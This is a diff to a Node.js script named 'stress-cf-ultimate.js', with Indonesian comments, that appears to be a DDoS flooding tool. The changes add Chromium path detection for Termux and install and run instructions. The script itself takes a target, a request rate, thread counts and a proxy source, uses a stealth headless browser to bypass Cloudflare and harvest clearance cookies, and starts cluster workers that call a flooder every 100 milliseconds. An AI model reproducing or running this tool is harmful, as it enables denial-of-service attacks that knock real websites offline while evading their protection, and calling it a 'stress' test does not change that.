@@ -1,4 +1,7 @@
 // stress-cf-ultimate.js 
+// Instalasi: npm install header-generator puppeteer-extra puppeteer-extra-plugin-stealth puppeteer axios https-proxy-agent user-agents --ignore-scripts
+// Jalankan: node stress-cf-ultimate.js <target> <duration_sec> <rate> <threads> <proxy_source>
+
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
@@ -11,6 +14,36 @@ const UserAgent = require('user-agents');
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 puppeteer.use(StealthPlugin());
+
+// ==================== DETEKSI CHROMIUM UNTUK TERMUX ====================
+function findChromiumPath() {
+  const possiblePaths = [
+    '/data/data/com.termux/files/usr/bin/chromium-browser', // <-- prioritas
+    '/data/data/com.termux/files/usr/bin/chromium',
+    '/usr/bin/chromium-browser',
+    '/usr/bin/chromium',
+  ];
+  for (const p of possiblePaths) {
+    if (fs.existsSync(p)) return p;
+  }
+  // Coba pakai 'which' via child_process
+  try {
+    const { execSync } = require('child_process');
+    const result = execSync('which chromium-browser chromium 2>/dev/null', { encoding: 'utf8' });
+    const lines = result.split('\n').filter(Boolean);
+    for (const line of lines) {
+      if (fs.existsSync(line)) return line;
+    }
+  } catch (e) {}
+  return null;
+}
+
+const CHROMIUM_PATH = findChromiumPath();
+if (!CHROMIUM_PATH) {
+  console.error('[Fatal] Chromium tidak ditemukan. Instal dengan: pkg install chromium');
+  process.exit(1);
+}
+console.log(`[Info] Menggunakan Chromium di: ${CHROMIUM_PATH}`);
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
@@ -138,7 +171,6 @@ class ProxyManager {
   }
 }
 
-// Health check proxy dengan CONNECT
 async function checkProxy(proxy, targetHost) {
   const [host, port] = proxy.split(':');
   return new Promise((resolve) => {
@@ -162,14 +194,11 @@ async function checkProxy(proxy, targetHost) {
 }
 
 // ==================== CLOUDFLARE BYPASS (PUPPETEER) ====================
-// Menggunakan executablePath dari environment atau default Termux
-const PUPPETEER_EXEC_PATH = process.env.PUPPETEER_EXECUTABLE_PATH || '/data/data/com.termux/files/usr/bin/chromium';
-
 async function getCloudflareCookie(targetUrl, proxy = null) {
   console.log(`[CF-Bypass] Mencoba cookie melalui ${proxy || 'tanpa proxy'}`);
   const browser = await puppeteer.launch({
     headless: true,
-    executablePath: PUPPETEER_EXEC_PATH,
+    executablePath: CHROMIUM_PATH,
     args: proxy ? [`--proxy-server=http://${proxy}`] : [],
     ignoreHTTPSErrors: true,
   });
@@ -306,6 +335,7 @@ if (cluster.isMaster) {
    Rate: ${args.rate} req/detik per worker
    Threads: ${args.threads}
    Proxy source: ${args.proxySource}
+   Chromium: ${CHROMIUM_PATH}
 =========================================\x1b[0m
   `);
 
@@ -362,4 +392,4 @@ if (cluster.isMaster) {
       setInterval(() => runFlooder(cookie, manager, parsedTarget), 100);
     }
   });
-      }
+                                          }
